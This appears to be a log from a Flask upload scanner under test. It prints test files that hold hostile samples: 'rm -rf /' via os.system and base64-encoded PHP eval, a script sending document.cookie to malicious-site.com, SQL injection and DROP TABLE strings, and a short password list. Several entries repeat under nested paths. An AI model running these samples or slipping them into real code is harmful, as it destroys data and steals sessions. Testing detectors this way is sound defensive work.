this script is for hacking sql attack and brute force attacks.
2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:20:02,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:20:02,300 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:20:02,300 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:20:02,300 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:20:02,300 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:20:02,300 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:20:02,300 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:20:02,300 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:20:02,300 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:20:02,300 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:20:02,300 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:20:02,302 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:20:02,302 - [33mPress CTRL+C to quit[0m
2025-02-22 20:20:21,699 - 127.0.0.1 - - [22/Feb/2025 20:20:21] "GET / HTTP/1.1" 200 -
2025-02-22 20:20:21,871 - 127.0.0.1 - - [22/Feb/2025 20:20:21] "GET / HTTP/1.1" 200 -
2025-02-22 20:20:22,903 - 127.0.0.1 - - [22/Feb/2025 20:20:22] "GET / HTTP/1.1" 200 -
2025-02-22 20:20:23,082 - 127.0.0.1 - - [22/Feb/2025 20:20:23] "GET / HTTP/1.1" 200 -
2025-02-22 20:20:23,262 - 127.0.0.1 - - [22/Feb/2025 20:20:23] "GET / HTTP/1.1" 200 -
2025-02-22 20:20:30,526 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:20:30,526 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:20:30,527 - Extracted content from uploads/test/test/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:20:30,527 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 20:20:30,527 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:20:30,527 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:20:30,527 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:20:30,527 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:20:30,527 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:20:30,529 - 127.0.0.1 - - [22/Feb/2025 20:20:30] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:20:30,534 - 127.0.0.1 - - [22/Feb/2025 20:20:30] "GET / HTTP/1.1" 200 -
2025-02-22 20:20:47,677 - Extracted content from uploads/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:20:47,677 - Malicious pattern detected in uploads/1/1.sql
2025-02-22 20:20:47,677 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:20:47,681 - 127.0.0.1 - - [22/Feb/2025 20:20:47] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:20:47,686 - 127.0.0.1 - - [22/Feb/2025 20:20:47] "GET / HTTP/1.1" 200 -
2025-02-22 20:22:49,011 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:22:49,013 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:22:49,014 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:22:49,016 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:22:49,017 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:22:49,018 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:22:49,018 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:22:49,020 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:22:49,021 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:22:49,022 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:22:49,023 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:22:49,024 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:22:49,025 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:22:49,026 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:22:49,027 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:22:49,029 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:22:49,030 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:22:49,032 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:22:49,033 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:22:49,034 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:22:49,035 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:22:49,036 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:22:49,037 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:22:49,038 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:22:49,040 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:22:49,041 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:22:49,042 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:22:49,043 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:22:49,044 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:22:49,045 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:22:49,046 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:22:49,048 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:22:49,049 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:22:49,051 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:22:49,053 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:22:49,054 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:22:49,055 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:22:49,057 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:22:49,058 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:22:49,059 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:22:49,060 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:22:49,062 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:22:49,063 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:22:49,064 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:22:49,065 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:22:49,066 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:22:49,068 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:22:49,069 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:22:49,070 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:22:49,071 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:22:49,072 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:22:49,073 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:22:49,074 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:22:49,075 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:22:49,077 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:22:49,078 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:22:49,079 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:22:49,080 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:22:49,081 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:22:49,082 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:22:49,083 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:22:49,084 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:22:49,085 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:22:49,086 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:22:49,088 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:22:49,089 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:22:49,090 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:22:49,092 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:22:49,093 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:22:49,095 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:22:49,096 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:22:49,097 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:22:49,102 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:22:49,102 - [33mPress CTRL+C to quit[0m
2025-02-22 20:22:54,000 - 127.0.0.1 - - [22/Feb/2025 20:22:54] "GET / HTTP/1.1" 200 -
2025-02-22 20:22:55,007 - 127.0.0.1 - - [22/Feb/2025 20:22:55] "GET / HTTP/1.1" 200 -
2025-02-22 20:23:00,642 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/create_malicious_xlsx.py: from openpyxl import Workbook

def create_malicious_xlsx(filename):
    # Create a new Workbook
    wb = Workbook()
    
    # Add a sheet
    ws = wb.active
    ws.title = "Malicious Data"
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "eval('some malicious code');"
    ]
    
    for index, line in enumerate(suspicious_content, start=1):
        ws[f'A{index}'] = line
    
    # Add susp
2025-02-22 20:23:00,642 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/create_malicious_xlsx.py
2025-02-22 20:23:00,642 - Moved create_malicious_xlsx.py to trash due to suspicious content.
2025-02-22 20:23:00,646 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:23:00,647 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/app.py: from flask import Flask, render_template, request, redirect, url_for, flash
import os
import sqlite3
import re
import logging
import zipfile
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['TRASH_FOLDER'] = 'trash'
app.config['ALLOWED_EXTENSIONS'] = {"docx", "xls", "xlsx", "ppt", "pptx", "odt", "txt", "py", "js", "c", "java", "zip", "r", "bsv", "yaml", "xml", "word", "xl", "xss", 
2025-02-22 20:23:00,648 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/app.py
2025-02-22 20:23:00,648 - Moved app.py to trash due to suspicious content.
2025-02-22 20:23:00,649 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/create_malicious_pptx.py: from pptx import Presentation

def create_malicious_pptx(filename):
    # Create a new Presentation
    ppt = Presentation()
    
    # Add a slide
    slide = ppt.slides.add_slide(ppt.slide_layouts[5])  # Title Slide layout
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "<script>alert('XSS');</script>",
        "eval('some malicious code');"
    ]
    
    for line in suspicious_content:

2025-02-22 20:23:00,649 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/create_malicious_pptx.py
2025-02-22 20:23:00,649 - Moved create_malicious_pptx.py to trash due to suspicious content.
2025-02-22 20:23:00,653 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 20:23:00,653 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/malicious.xlsx
2025-02-22 20:23:00,653 - Moved malicious.xlsx to trash due to suspicious content.
2025-02-22 20:23:00,658 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 20:23:00,658 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/malicious.pptx
2025-02-22 20:23:00,658 - Moved malicious.pptx to trash due to suspicious content.
2025-02-22 20:23:00,661 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

